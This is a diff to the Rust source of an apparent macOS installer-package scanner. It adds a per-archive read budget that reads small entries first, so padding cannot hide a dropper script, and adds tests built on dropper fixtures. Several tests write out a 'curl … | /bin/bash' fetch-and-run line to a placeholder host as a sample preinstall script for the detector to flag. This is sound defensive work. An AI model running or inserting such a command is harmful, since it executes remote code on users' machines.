@@ -74,20 +74,43 @@ impl InstallerScriptRule {
             return Err(RuleOutcome::NotApplicable);
         }
 
-        let mut findings = ScriptFindings::default();
         let mut unreadable = false;
+        let mut budget = xar::ReadBudget::new(limits);
 
-        for entry in archive.metadata_entries() {
-            let result = match entry.name.as_str() {
-                "Scripts" => {
-                    scan_scripts_entry(ctx, content, &archive, entry, limits, &mut findings)
-                }
-                "Distribution" => {
-                    scan_distribution_entry(ctx, content, &archive, entry, limits, &mut findings)
-                }
-                _ => continue,
+        // Cheapest to read first: small real entries are read in full before
+        // large or padded ones, and their unused allowance carries forward.
+        // Ties keep shallower, then TOC, order (the sort is stable). An entry
+        // that cannot be read at all takes no share.
+        let mut work = Vec::new();
+        let wanted = archive
+            .metadata_entries()
+            .filter(|e| matches!(e.name.as_str(), "Scripts" | "Distribution"));
+        for (toc_index, entry) in wanted.enumerate() {
+            match xar::entry_cost(content, &archive, entry) {
+                Ok(cost) => work.push((toc_index, cost, entry, ScriptFindings::default())),
+                Err(_) => unreadable = true,
+            }
+        }
+        work.sort_by_key(|(_, cost, entry, _)| (*cost, entry.depth));
+
+        // Findings are merged in TOC order below, so the report does not
+        // depend on read order.
+        let total = work.len();
+        for (rank, (_, _, entry, found)) in work.iter_mut().enumerate() {
+            budget.start_entry(total - rank);
+            let result = if entry.name == "Scripts" {
+                scan_scripts_entry(ctx, content, &archive, entry, &mut budget, found)
+            } else {
+                scan_distribution_entry(ctx, content, &archive, entry, &mut budget, found)
             };
             unreadable |= result.is_err();
+        }
+        work.sort_by_key(|(toc_index, _, _, _)| *toc_index);
+
+        let mut findings = ScriptFindings::default();
+        for (_, _, _, found) in work {
+            findings.total = findings.total.saturating_add(found.total);
+            findings.descriptions.extend(found.descriptions);
         }
 
         // Nothing scored: clean only if every entry was actually read.
@@ -145,31 +168,52 @@ fn scan_scripts_entry(
     content: &[u8],
     archive: &xar::XarArchive,
     entry: &xar::XarFile,
-    limits: &xar::XarLimits,
+    budget: &mut xar::ReadBudget,
     findings: &mut ScriptFindings,
 ) -> Result<(), RuleOutcome> {
     // An entry we can't reach (bounded read stopped short) is
     // unreadable, not absent. A partial read is scanned, then reported
     // unreadable below.
-    let (raw, mut gap) = xar::read_entry_partial(content, archive, entry, limits)
+    let (raw, mut gap) = budget
+        .read_entry_partial(content, archive, entry)
         .map_err(|_| RuleOutcome::NotApplicable)?;
 
     let label = format!("{}!{}", ctx.path.display(), entry.path);
-    // Scripts is normally gzip-wrapped cpio; if not gzip, `read_entry`
-    // already undid the heap encoding. A damaged inner gzip is scanned as far
-    // as it decoded, and the raw bytes are scanned too unless the stream was
-    // merely over budget (valid DEFLATE has nothing to find).
-    let archive_bytes = match crate::inflate::gzip_decompress_partial(&raw, limits.max_entry_bytes)
-    {
-        (v, Ok(())) => v,
-        (v, Err(e)) if !v.is_empty() => {
-            if e != crate::decode::DecodeError::BudgetExceeded {
-                findings.scan(label.clone(), raw, "install scripts (unparsed)");
+    // Scripts is normally gzip-wrapped cpio; if not gzip, the heap read
+    // already undid the entry's encoding. A damaged inner gzip is scanned as
+    // far as it decoded, and the raw bytes are scanned too unless the stream
+    // was merely over budget (valid DEFLATE has nothing to find).
+    let archive_bytes = if !crate::inflate::has_gzip_magic(&raw) {
+        raw
+    } else {
+        // The inner layer reads all of `raw` as input, then writes its output.
+        budget.charge(raw.len());
+        let cap = budget.entry_cap();
+        if cap == 0 {
+            gap.get_or_insert(xar::XarEntryError::BUDGET_EXCEEDED);
+            raw
+        } else {
+            match crate::inflate::gzip_decompress_partial(&raw, cap) {
+                (v, Ok(())) => {
+                    budget.charge(v.len());
+                    v
+                }
+                (v, Err(e)) if !v.is_empty() => {
+                    budget.charge(v.len());
+                    if e != crate::decode::DecodeError::BudgetExceeded {
+                        findings.scan(label.clone(), raw, "install scripts (unparsed)");
+                    }
+                    gap.get_or_insert(xar::XarEntryError::Undecodable(e));
+                    v
+                }
+                (_, Err(e)) => {
+                    if e == crate::decode::DecodeError::BudgetExceeded {
+                        gap.get_or_insert(xar::XarEntryError::BUDGET_EXCEEDED);
+                    }
+                    raw
+                }
             }
-            gap.get_or_insert(xar::XarEntryError::Undecodable(e));
-            v
         }
-        (_, Err(_)) => raw,
     };
 
     let Some(members) = cpio::parse(&archive_bytes, &cpio::CpioLimits::default()) else {
@@ -470,10 +514,11 @@ fn scan_distribution_entry(
     content: &[u8],
     archive: &xar::XarArchive,
     entry: &xar::XarFile,
-    limits: &xar::XarLimits,
+    budget: &mut xar::ReadBudget,
     findings: &mut ScriptFindings,
 ) -> Result<(), RuleOutcome> {
-    let (raw, gap) = xar::read_entry_partial(content, archive, entry, limits)
+    let (raw, gap) = budget
+        .read_entry_partial(content, archive, entry)
         .map_err(|_| RuleOutcome::NotApplicable)?;
     // The `.js` suffix makes `classify_text` treat even a short buffer as script.
     let label = format!("{}!{}.js", ctx.path.display(), entry.path);
@@ -1828,12 +1873,142 @@ mod tests {
         );
     }
 
+    // --- per-archive read-back budget (#76) -------------------------------
+
+    const ZLIB_ORDINARY: &[u8] =
+        include_bytes!("../../testdata/inflate/zlib_distribution_ordinary.in");
+    const ZLIB_DROPPER: &[u8] =
+        include_bytes!("../../testdata/inflate/zlib_distribution_dropper.in");
+
+    fn small_limits() -> xar::XarLimits {
+        xar::XarLimits {
+            max_entry_bytes: 4096,
+            max_read_back_bytes: 8192,
+            ..xar::XarLimits::default()
+        }
+    }
+
+    /// A `Distribution` file for heap bytes `[offset, offset + len)`, wrapped
+    /// in `depth` directories.
+    fn distribution_at(offset: usize, len: usize, depth: usize) -> String {
+        let mut s = format!(
+            r#"<file><name>Distribution</name><type>file</type><data><offset>{offset}</offset><length>{len}</length><size>{len}</size></data></file>"#
+        );
+        for _ in 0..depth {
+            s = format!("<file><name>d</name><type>directory</type>{s}</file>");
+        }
+        s
+    }
+
+    /// A xar with `toc_body` and a heap of `ZLIB_ORDINARY` then `ZLIB_DROPPER`.
+    fn budget_archive(toc_body: &str) -> Vec<u8> {
+        let mut bytes = xar::toc_xar_bytes(toc_body);
+        bytes.extend_from_slice(ZLIB_ORDINARY);
+        bytes.extend_from_slice(ZLIB_DROPPER);
+        bytes
+    }
+
+    fn benign(depth: usize) -> String {
+        distribution_at(0, ZLIB_ORDINARY.len(), depth)
+    }
+
+    fn dropper(depth: usize) -> String {
+        distribution_at(ZLIB_ORDINARY.len(), ZLIB_DROPPER.len(), depth)
+    }
+
     fn evaluate_small(
         bytes: &[u8],
         limits: &xar::XarLimits,
     ) -> (Result<Option<MatchedSignal>, RuleOutcome>, ScanContext) {
         let c = ctx("b.pkg", bytes);
         (InstallerScriptRule.evaluate_with(&c, limits), c)
+    }
+
+    #[test]
+    fn many_entries_over_the_budget_are_incomplete_and_bounded() {
+        let limits = small_limits();
+        let one = budget_archive(&benign(0));
+        assert!(matches!(evaluate_small(&one, &limits).0, Ok(None)));
+
+        let many = budget_archive(&benign(0).repeat(50));
+        let (r, _) = evaluate_small(&many, &limits);
+        assert!(matches!(r, Err(RuleOutcome::NotApplicable)), "{r:?}");
+
+        // The same reads, directly: the work stays within the budget.
+        let a = xar::parse(&many, &limits).expect("xar");
+        let mut budget = xar::ReadBudget::new(&limits);
+        let entries: Vec<_> = a.metadata_entries().collect();
+        let mut refused = 0;
+        for (i, f) in entries.iter().enumerate() {
+            budget.start_entry(entries.len() - i);
+            // A read cut short by its allowance carries a gap.
+            if !matches!(budget.read_entry_partial(&many, &a, f), Ok((_, None))) {
+                refused += 1;
+            }
+        }
+        assert!(budget.remaining() <= limits.max_read_back_bytes);
+        assert!(refused > 20, "{refused}");
+    }
+
+    #[test]
+    fn a_small_dropper_is_read_despite_nested_padding() {
+        let limits = small_limits();
+        let toc = format!("{}{}", benign(1).repeat(50), dropper(0));
+        let (r, c) = evaluate_small(&budget_archive(&toc), &limits);
+        let signal = r.expect("evaluates").expect("the dropper scores");
+        assert!(
+            signal.description.contains("launches an interpreter"),
+            "{}",
+            signal.description
+        );
+        assert!(c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    #[test]
+    fn an_entry_the_budget_cannot_reach_is_unread_not_clean() {
+        let limits = small_limits();
+        let toc = format!("{}{}", benign(0).repeat(50), dropper(1));
+        // The dropper's compressed bytes alone exceed the whole budget.
+        let tiny = xar::XarLimits {
+            max_read_back_bytes: ZLIB_DROPPER.len() - 1,
+            ..limits
+        };
+        let (r, _) = evaluate_small(&budget_archive(&toc), &tiny);
+        assert!(matches!(r, Err(RuleOutcome::NotApplicable)), "{r:?}");
+
+        // Control: with room to read it, the dropper is found.
+        let roomy = xar::XarLimits {
+            max_read_back_bytes: 1 << 20,
+            ..limits
+        };
+        let (r, _) = evaluate_small(&budget_archive(&toc), &roomy);
+        assert!(r.expect("evaluates").is_some());
+    }
+
+    /// The inner gzip is decoded under what the outer read left: none, or a
+    /// few bytes. Either way the entry is incomplete, never clean.
+    #[test]
+    fn a_scripts_entry_whose_inner_gzip_has_no_budget_left_is_incomplete() {
+        let full = include_bytes!("../../testdata/gzip/scripts_dropper.in");
+        let bytes = pkg_with_scripts(&zlib_stored(full));
+        for spare in [0, 5] {
+            let limits = xar::XarLimits {
+                max_entry_bytes: 4096,
+                max_read_back_bytes: full.len() + spare,
+                ..xar::XarLimits::default()
+            };
+            let (r, c) = evaluate_small(&bytes, &limits);
+            match r {
+                Err(RuleOutcome::NotApplicable) => {}
+                Ok(Some(_)) => assert!(c.marked_incomplete("installer-script-suspicious")),
+                other => panic!("spare {spare}: {other:?}"),
+            }
+        }
+
+        // Control: enough budget reads the same archive complete.
+        let (r, c) = evaluate_small(&bytes, &small_limits());
+        assert!(r.expect("evaluates").is_some());
+        assert!(!c.marked_incomplete("installer-script-suspicious"));
     }
 
     /// A stored `Distribution` over the entry cap whose script is inside the
@@ -1856,5 +2031,350 @@ mod tests {
             signal.description
         );
         assert!(c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    /// A benign zlib `Distribution` of about 6 KB, past the 4096-byte entry cap.
+    fn padding_blob() -> Vec<u8> {
+        let mut doc = b"<installer-gui-script><title>x</title>".to_vec();
+        doc.resize(6000, b' ');
+        doc.extend_from_slice(b"</installer-gui-script>");
+        zlib_stored(&doc)
+    }
+
+    /// `padding` top-level padding entries, then the dropper last in the TOC.
+    /// `distinct` gives each padding entry its own heap bytes; otherwise they
+    /// share one blob.
+    fn padded_dropper_archive(padding: usize, distinct: bool) -> Vec<u8> {
+        let pad = padding_blob();
+        let copies = if distinct { padding } else { 1 };
+        let mut toc = String::new();
+        for i in 0..padding {
+            let at = if distinct { i * pad.len() } else { 0 };
+            toc += &distribution_at(at, pad.len(), 0);
+        }
+        toc += &distribution_at(copies * pad.len(), ZLIB_DROPPER.len(), 0);
+        let mut bytes = xar::toc_xar_bytes(&toc);
+        for _ in 0..copies {
+            bytes.extend_from_slice(&pad);
+        }
+        bytes.extend_from_slice(ZLIB_DROPPER);
+        bytes
+    }
+
+    /// Padding that decodes past the entry cap cannot starve a dropper that
+    /// comes after it in the TOC.
+    #[test]
+    fn same_depth_padding_does_not_starve_the_dropper() {
+        // Spending first-come, the padding would use up the budget in twelve reads.
+        let limits = xar::XarLimits {
+            max_entry_bytes: 4096,
+            max_read_back_bytes: 120_000,
+            ..xar::XarLimits::default()
+        };
+        for distinct in [false, true] {
+            let (r, c) = evaluate_small(&padded_dropper_archive(16, distinct), &limits);
+            let signal = r.expect("evaluates").expect("the dropper scores");
+            assert!(
+                signal.description.contains("launches an interpreter"),
+                "{}",
+                signal.description
+            );
+            assert!(c.marked_incomplete("installer-script-suspicious"));
+        }
+    }
+
+    #[test]
+    fn a_dropper_is_found_among_many_padding_entries() {
+        let limits = xar::XarLimits {
+            max_entry_bytes: 4096,
+            max_read_back_bytes: 64 * 1024,
+            ..xar::XarLimits::default()
+        };
+        let toc = format!("{}{}", benign(0).repeat(200), dropper(0));
+        let (r, c) = evaluate_small(&budget_archive(&toc), &limits);
+        let signal = r.expect("evaluates").expect("the dropper scores");
+        assert!(signal.description.contains("launches an interpreter"));
+        assert!(c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    /// A `Scripts` entry (zlib on the heap) then a dropper `Distribution`: the
+    /// cheaper `Distribution` is read first but reported second.
+    fn scripts_then_distribution(scripts_blob: &[u8]) -> Vec<u8> {
+        let toc = format!(
+            r#"<file id="1"><name>Scripts</name><type>file</type><data><offset>{}</offset><length>{}</length><size>{}</size></data></file>{}"#,
+            ZLIB_DROPPER.len(),
+            scripts_blob.len(),
+            scripts_blob.len(),
+            distribution_at(0, ZLIB_DROPPER.len(), 0)
+        );
+        let mut bytes = xar::toc_xar_bytes(&toc);
+        bytes.extend_from_slice(ZLIB_DROPPER);
+        bytes.extend_from_slice(scripts_blob);
+        bytes
+    }
+
+    #[test]
+    fn findings_are_reported_in_toc_order_and_match_unlimited_limits() {
+        let gz = include_bytes!("../../testdata/gzip/scripts_dropper.in");
+        let scripts = zlib_stored(gz);
+        assert!(scripts.len() > ZLIB_DROPPER.len(), "Scripts is read second");
+        let bytes = scripts_then_distribution(&scripts);
+
+        let (small, c) = evaluate_small(&bytes, &small_limits());
+        let small = small.expect("evaluates").expect("scores");
+        let scripts_at = small.description.find("install script").expect("scripts");
+        let dist_at = small.description.find("distribution script").expect("dist");
+        assert!(scripts_at < dist_at, "{}", small.description);
+        assert!(!c.marked_incomplete("installer-script-suspicious"));
+
+        let (big, _) = evaluate_small(&bytes, &xar::XarLimits::default());
+        let big = big.expect("evaluates").expect("scores");
+        assert_eq!(
+            (small.weight, small.description),
+            (big.weight, big.description)
+        );
+    }
+
+    /// Plain cpio `Scripts` whose read uses the whole allowance has no gzip
+    /// layer left to read: complete, not unreadable.
+    #[test]
+    fn a_plain_cpio_scripts_read_that_lands_on_the_allowance_is_complete() {
+        for (body, scores) in [
+            (&b"echo hi\n"[..], false),
+            (
+                &b"#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n"[..],
+                true,
+            ),
+        ] {
+            let mut cpio = odc_member("preinstall", body);
+            cpio.extend(odc_member("TRAILER!!!", b""));
+            let blob = zlib_stored(&cpio);
+            let bytes = pkg_with_scripts(&blob);
+            // Input is at most half the allowance, and output needs the rest.
+            let cost = (2 * blob.len()).max(blob.len() + cpio.len());
+            let exact = xar::XarLimits {
+                max_entry_bytes: 1 << 20,
+                max_read_back_bytes: cost,
+                ..xar::XarLimits::default()
+            };
+            let (r, c) = evaluate_small(&bytes, &exact);
+            assert_eq!(r.expect("complete").is_some(), scores);
+            assert!(!c.marked_incomplete("installer-script-suspicious"));
+
+            // One byte less cuts the outer read: never clean.
+            let tight = xar::XarLimits {
+                max_read_back_bytes: cost - 1,
+                ..exact
+            };
+            let (r, c) = evaluate_small(&bytes, &tight);
+            match r {
+                Err(RuleOutcome::NotApplicable) => {}
+                Ok(Some(_)) => assert!(c.marked_incomplete("installer-script-suspicious")),
+                other => panic!("{other:?}"),
+            }
+        }
+    }
+
+    /// A gzip of small stored DEFLATE blocks: the plaintext sits in the raw
+    /// bytes, and a cut lands mid-block as truncation, not as a budget error.
+    fn gzip_stored(inner: &[u8]) -> Vec<u8> {
+        let mut gz = vec![0x1f, 0x8b, 0x08, 0, 0, 0, 0, 0, 0, 3];
+        let chunks: Vec<&[u8]> = inner.chunks(60).collect();
+        for (i, chunk) in chunks.iter().enumerate() {
+            let n = u16::try_from(chunk.len()).expect("small");
+            gz.push(u8::from(i + 1 == chunks.len()));
+            gz.extend_from_slice(&n.to_le_bytes());
+            gz.extend_from_slice(&(!n).to_le_bytes());
+            gz.extend_from_slice(chunk);
+        }
+        gz.extend_from_slice(&[0; 8]);
+        gz
+    }
+
+    /// An odc cpio holding a scoring `preinstall`.
+    fn scoring_cpio() -> Vec<u8> {
+        let body = b"#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n".repeat(6);
+        let mut cpio = odc_member("preinstall", &body);
+        cpio.extend(odc_member("TRAILER!!!", b""));
+        cpio
+    }
+
+    /// A budget-cut outer read is incomplete, never clean.
+    #[test]
+    fn a_budget_cut_scripts_read_is_incomplete() {
+        let gz = gzip_stored(&scoring_cpio());
+        let blob = zlib_stored(&gz);
+        let bytes = pkg_with_scripts(&blob);
+
+        for outer_out in [5, 40, 140, 300, 480] {
+            let limits = xar::XarLimits {
+                max_entry_bytes: outer_out,
+                ..xar::XarLimits::default()
+            };
+            let (r, c) = evaluate_small(&bytes, &limits);
+            match r {
+                Err(RuleOutcome::NotApplicable) => {}
+                Ok(Some(_)) => assert!(c.marked_incomplete("installer-script-suspicious")),
+                other => panic!("{outer_out}: {other:?}"),
+            }
+        }
+    }
+
+    /// The outer read lands exactly on the allowance, so the inner gzip cannot
+    /// be decoded: incomplete, never clean.
+    #[test]
+    fn a_gzip_scripts_entry_the_budget_cannot_decode_is_incomplete() {
+        let gz = gzip_stored(&scoring_cpio());
+        let blob = zlib_stored(&gz);
+        let bytes = pkg_with_scripts(&blob);
+        let limits = xar::XarLimits {
+            max_entry_bytes: 1 << 20,
+            max_read_back_bytes: blob.len() + gz.len(),
+            ..xar::XarLimits::default()
+        };
+        let (r, c) = evaluate_small(&bytes, &limits);
+        match r {
+            Err(RuleOutcome::NotApplicable) => {}
+            Ok(Some(_)) => assert!(c.marked_incomplete("installer-script-suspicious")),
+            other => panic!("{other:?}"),
+        }
+
+        // With room for the inner layer the decoded script scores.
+        let roomy = xar::XarLimits {
+            max_read_back_bytes: 1 << 20,
+            ..limits
+        };
+        let (r, _) = evaluate_small(&bytes, &roomy);
+        assert!(r.expect("evaluates").is_some());
+    }
+
+    /// A zlib `Scripts` entry that decodes to `1f 8b` plus a non-gzip header
+    /// and a plaintext script, cut by the entry cap: the script text inside the
+    /// prefix is still scanned.
+    #[test]
+    fn a_cut_scripts_entry_with_a_broken_inner_layer_is_scanned_as_text() {
+        let mut inner = vec![0x1f, 0x8b, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff];
+        inner.extend_from_slice(
+            b"\n#!/bin/bash\ncurl -fsSL https://example.invalid/a.sh | /bin/bash\n",
+        );
+        let prefix = inner.len();
+        inner.resize(prefix + 600, b' ');
+        let bytes = pkg_with_scripts(&zlib_stored(&inner));
+        let limits = xar::XarLimits {
+            max_entry_bytes: prefix + 20,
+            ..xar::XarLimits::default()
+        };
+        let (r, c) = evaluate_small(&bytes, &limits);
+        let signal = r.expect("evaluates").expect("the prefix scores");
+        assert!(signal.weight > 0);
+        assert!(c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    const BZIP2_DROPPER: &[u8] = include_bytes!("../../testdata/bzip2/distribution_dropper.in");
+
+    /// `n` top-level `Scripts` entries over the heap bytes `[0, len)`.
+    fn scripts_toc(len: usize, n: usize) -> String {
+        format!(
+            r#"<file><name>Scripts</name><type>file</type><data><offset>0</offset><length>{len}</length><size>{len}</size></data></file>"#
+        )
+        .repeat(n)
+    }
+
+    /// Unreadable entries (heap ranges outside the archive) take no share of
+    /// the budget, so a bzip2 dropper among them is still read.
+    #[test]
+    fn unreadable_entries_do_not_dilute_a_bzip2_droppers_share() {
+        assert_eq!(crate::bzip2::block_size(BZIP2_DROPPER), Some(900_000));
+        let mut toc = distribution_at(0, BZIP2_DROPPER.len(), 0);
+        toc += &distribution_at(1 << 30, 1000, 0).repeat(300);
+        let mut bytes = xar::toc_xar_bytes(&toc);
+        bytes.extend_from_slice(BZIP2_DROPPER);
+
+        let (r, c) = evaluate_small(&bytes, &xar::XarLimits::default());
+        let signal = r.expect("evaluates").expect("the dropper scores");
+        assert!(
+            signal.description.contains("launches an interpreter"),
+            "{}",
+            signal.description
+        );
+        assert!(c.marked_incomplete("installer-script-suspicious"));
+    }
+
+    /// A bzip2 entry costs a block, so it is read after the many small
+    /// entries and gets what they left.
+    #[test]
+    fn a_bzip2_entry_among_many_small_ones_is_read_last_and_in_full() {
+        let mut cpio = odc_member("preinstall", b"#!/bin/sh\necho hello\n");
+        cpio.extend(odc_member("TRAILER!!!", b""));
+        let mut toc = distribution_at(0, BZIP2_DROPPER.len(), 0);
+        toc += &scripts_toc(cpio.len(), 400).replace(
+            "<offset>0</offset>",
+            &format!("<offset>{}</offset>", BZIP2_DROPPER.len()),
+        );
+        let mut bytes = xar::toc_xar_bytes(&toc);
+        bytes.extend_from_slice(BZIP2_DROPPER);
+        bytes.extend_from_slice(&cpio);
+
+        let (r, c) = evaluate_small(&bytes, &xar::XarLimits::default());
+        let got = r.expect("evaluates").expect("the dropper scores");
+        assert!(!c.marked_incomplete("installer-script-suspicious"));
+
+        let unlimited = xar::XarLimits {
+            max_read_back_bytes: usize::MAX / 2,
+            ..xar::XarLimits::default()
+        };
+        let (r, c) = evaluate_small(&bytes, &unlimited);
+        let want = r.expect("evaluates").expect("the dropper scores");
+        assert!(!c.marked_incomplete("installer-script-suspicious"));
+        assert_eq!(
+            (got.weight, got.description),
+            (want.weight, want.description)
+        );
+    }
+
+    /// A gzip of `empty_blocks` empty stored blocks: no output, a few KB in.
+    fn empty_gzip(empty_blocks: usize) -> Vec<u8> {
+        let mut gz = vec![0x1f, 0x8b, 0x08, 0, 0, 0, 0, 0, 0, 3];
+        for _ in 0..empty_blocks {
+            gz.extend_from_slice(&[0x00, 0x00, 0x00, 0xff, 0xff]);
+        }
+        gz.extend_from_slice(&[0x01, 0x00, 0x00, 0xff, 0xff]);
+        gz.extend_from_slice(&[0; 8]);
+        gz
+    }
+
+    /// The inner gzip's input is charged as well as the outer read's input
+    /// and output: a budget of exactly `k` such entries reads `k` and no more.
+    #[test]
+    fn a_scripts_entrys_inner_gzip_input_is_charged() {
+        let gz = empty_gzip(600);
+        let blob = zlib_stored(&gz);
+        let per_entry = blob.len() + 2 * gz.len();
+        let k = 3;
+        let limits = xar::XarLimits {
+            max_entry_bytes: 1 << 20,
+            max_read_back_bytes: k * per_entry,
+            ..xar::XarLimits::default()
+        };
+        let mut bytes = xar::toc_xar_bytes(&scripts_toc(blob.len(), 2 * k));
+        bytes.extend_from_slice(&blob);
+        let c = ctx("b.pkg", &bytes);
+        let archive = xar::parse(&bytes, &limits).expect("xar");
+        let mut budget = xar::ReadBudget::new(&limits);
+
+        let mut charged = Vec::new();
+        for entry in &archive.files {
+            budget.start_entry(1);
+            let before = budget.remaining();
+            let mut found = ScriptFindings::default();
+            // The empty archive is not complete either way; only the charge matters.
+            let _ = scan_scripts_entry(&c, &bytes, &archive, entry, &mut budget, &mut found);
+            charged.push(before - budget.remaining());
+        }
+        assert_eq!(charged, [per_entry, per_entry, per_entry, 0, 0, 0]);
+
+        // Through the rule, the same archive is never reported clean.
+        let (r, _) = evaluate_small(&bytes, &limits);
+        assert!(matches!(r, Err(RuleOutcome::NotApplicable)), "{r:?}");
     }
 }
